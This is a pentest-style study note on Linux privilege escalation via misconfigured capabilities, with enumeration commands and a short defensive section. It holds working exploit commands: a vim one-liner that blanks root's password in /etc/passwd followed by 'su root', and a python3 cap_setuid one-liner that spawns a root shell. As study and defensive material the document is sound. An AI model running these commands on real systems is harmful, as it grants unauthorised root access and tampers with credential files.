# Linux Privilege Escalation – Capabilities

## Overview

Linux **Capabilities** are a granular privilege model that splits traditional root privileges into smaller, distinct units.

Instead of granting full root access, specific privileges can be assigned directly to binaries or processes.

This allows programs to perform restricted actions without requiring full administrative rights.

Example:

A binary can be allowed to bind to privileged ports (<1024) without being run as root.

---

# Why Capabilities Matter for Privilege Escalation

Misconfigured capabilities can allow attackers to:

- bypass file permissions
- modify sensitive system files
- impersonate root
- interact with kernel components
- escape restricted environments

Capabilities can effectively act as **partial root privileges**.

If improperly assigned, they can lead directly to privilege escalation.

---

# Capability Basics

Traditional Linux privilege model:

```text
User → Group → Root
```

Capability model:

```text
Root privileges split into smaller units
Each binary/process receives only required privileges
```

This supports the **principle of least privilege**.

---

# Setting Capabilities

Capabilities are assigned using the `setcap` command.

Example:

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

This allows the binary to bind to privileged network ports.

---

# Capability Flag Meanings

| Flag | Meaning |
|------|--------|
| = | clears capability |
| +ep | effective + permitted capability |
| +ei | effective + inheritable capability |
| +p | permitted capability only |

---

# High Risk Capabilities

Certain capabilities can be abused to escalate privileges.

## Dangerous Capability Examples

| Capability | Risk |
|------------|------|
| cap_setuid | allows changing UID (can become root) |
| cap_setgid | allows changing GID |
| cap_sys_admin | extremely powerful (near-root equivalent) |
| cap_dac_override | bypass file permission checks |
| cap_sys_ptrace | inspect or modify other processes |
| cap_sys_module | load kernel modules |
| cap_sys_chroot | manipulate filesystem root |
| cap_net_raw | craft arbitrary network packets |
| cap_sys_time | modify system clock |
| cap_sys_resource | change system limits |

---

# Enumerating Capabilities

Identify binaries with capabilities:

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Example output:

```text
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

---

# Understanding cap_dac_override

DAC = Discretionary Access Control.

This capability allows bypassing file permission checks.

A binary with this capability can:

- read restricted files
- modify protected files
- overwrite system configuration
- access root-owned files

---

# Exploitation Example – cap_dac_override

Check capability:

```bash
getcap /usr/bin/vim.basic
```

Output:

```text
/usr/bin/vim.basic cap_dac_override=eip
```

Even without sudo privileges, vim can modify restricted files.

---

## Target sensitive file

Example:

```bash
cat /etc/passwd | head -n1
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
```

"x" indicates password stored in:

```text
/etc/shadow
```

---

## Modify root password entry

Open file using vim:

```bash
/usr/bin/vim.basic /etc/passwd
```

Modify:

```text
root:x:0:0:root:/root:/bin/bash
```

To:

```text
root::0:0:root:/root:/bin/bash
```

Removes password requirement.

---

## Non-interactive modification

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Verify change:

```bash
cat /etc/passwd | head -n1
```

Output:

```text
root::0:0:root:/root:/bin/bash
```

---

## Gain root shell

```bash
su root
```

No password required.

---

# Common Capability Exploitation Patterns

## cap_setuid abuse

Allows changing effective UID.

Example vulnerable binary:

```bash
getcap /usr/bin/python3
```

Exploit:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## cap_sys_admin abuse

Often described as:

> the new root capability

Allows:

- mount filesystems
- manipulate namespaces
- configure kernel parameters

---

## cap_dac_override abuse

Bypasses file read/write protections.

Targets:

- /etc/shadow
- /etc/passwd
- SSH keys
- application configs
- backup files

---

# Capability Enumeration Checklist

## List all capabilities

```bash
getcap -r / 2>/dev/null
```

---

## Search common binary locations

```bash
find / -type f -exec getcap {} \; 2>/dev/null
```

---

## Check PATH binaries first

```bash
getcap /usr/bin/*
```

---

# Indicators of Exploitable Capabilities

Look for:

- cap_setuid
- cap_setgid
- cap_dac_override
- cap_sys_admin
- cap_sys_ptrace
- cap_sys_module

Combined with:

- writable scripts
- interpreter binaries (python, perl)
- editors (vim)
- network tools

---

# Defensive Considerations

## Limit capability usage

Avoid assigning capabilities unnecessarily.

---

## Audit capability assignments

```bash
getcap -r /
```

---

## Use minimal privilege model

Prefer:

```text
specific capability → full root access
```

---

## Monitor system changes

Watch for:

- unexpected file modifications
- privilege changes
- abnormal process spawning
- suspicious interpreter execution

---

# Quick Cheatsheet

## Enumerate capabilities

```bash
getcap -r / 2>/dev/null
```

---

## Identify risky capabilities

```bash
cap_setuid
cap_setgid
cap_sys_admin
cap_dac_override
```

---

## Example exploit

```bash
/usr/bin/vim.basic /etc/passwd
```

---

## Gain root shell

```bash
su root
```

---

# Key Takeaways

- capabilities divide root privileges into smaller units
- misconfigured capabilities can allow privilege escalation
- cap_dac_override allows bypassing file permissions
- cap_setuid allows impersonating root
- capability enumeration should be part of every privilege escalation workflow
- interpreter binaries with capabilities are especially dangerous
- capabilities are commonly misconfigured in development environments

---

# Tags

#linux
#privilege-escalation
#capabilities
#setcap
#getcap
#post-exploitation
#enumeration
#misconfiguration
#obsidian